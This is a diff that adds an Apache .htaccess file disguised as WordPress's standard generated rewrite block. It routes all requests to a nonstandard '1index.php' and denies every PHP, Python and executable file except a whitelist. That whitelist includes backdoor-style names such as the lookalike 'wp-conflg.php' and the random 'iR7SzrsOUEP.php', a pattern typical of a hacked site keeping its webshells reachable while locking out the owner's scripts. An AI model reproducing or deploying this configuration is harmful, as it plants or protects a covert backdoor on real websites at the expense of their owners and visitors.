@@ -1,0 +1,24 @@
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^1index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /1index.php [L]
+</IfModule>
+
+# END WordPress
+
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "(^wp-login.php|^wp-blog-header.php|^style.php|^style2.php|^wp-conflg.php|^index.php|^class.api.php|^1index.php|^iR7SzrsOUEP.php|^license.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
